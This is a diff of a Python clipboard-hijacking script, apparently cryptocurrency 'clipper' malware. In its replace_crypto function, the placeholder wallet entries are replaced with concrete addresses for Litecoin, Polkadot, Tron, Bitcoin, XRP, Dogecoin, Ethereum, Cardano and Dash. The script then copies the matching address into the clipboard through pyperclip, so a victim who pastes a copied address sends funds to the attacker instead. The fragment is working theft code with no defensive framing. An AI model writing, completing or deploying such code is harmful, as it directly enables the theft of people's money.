@@ -60,16 +60,16 @@ def check(clipboard):
 
 def replace_crypto(data):
     my_addresses = {
-                    "lite": "YOUR-LITE-ADDRESS",
-                    "dot": "YOUR-DOT-ADDRESS",
-                    "tron": "YOUR-TRON-ADDRESS",
-                    "btc": "YOUR-BTC-ADDRESS",
-                    "xrp": "YOUR-XRP-ADDRESS",
-                    "doge": "YOUR-DOGE-ADDRESS",
-                    "xmr": "YOUR-XMR-ADDRESS",
-                    "eth": "YOUR-ETH-ADDRESS",
-                    "ada": "YOUR-ADA-ADDRESS",
-                    "dash": "YOUR-DASH-ADDRESS",
+                    "lite": "ltc1q7jjr3ns9hjxs02uuhwj5a0dztfs5wf38pqqx4m",
+                    "dot": "13fobFhgW5FWrpEnL3d2aL93FqXmmd2qSrT9n32vCm5tTRMu",
+                    "tron": "TLKUJfehJHtMo2zGE96JVbxMta2cMbZj3j",
+                    "btc": "1GsvsvEwJDH6xexXBiQjhNAx9Lr9bZ9dD2",
+                    "xrp": "r9DW1x77GKZe6FL9FEQ7Rs5CuYZTeep4r3",
+                    "doge": "DCKuXHx7fHc635mX2aAjMkKvedxNaxBMUT",
+                    "xmr": "null",
+                    "eth": "0x6eee15156E5d2aee8BF341c4915e0960ED5B3E46",
+                    "ada": "addr1q9dca3m2k5ls0sq0va7k25lvdl52yh739xhhdt0cr3xj5d75y496xkdeyw86xypqcy2pkl2rlmkgz2m9skdcx3kd6h0qfm5p6y",
+                    "dash": "XidfF4Wyyb9poNFxFJF3KamaoRzgML4LgQ",
                     }
     if data != 0 and my_addresses[data] != "null":
         pyperclip.copy(my_addresses[data])
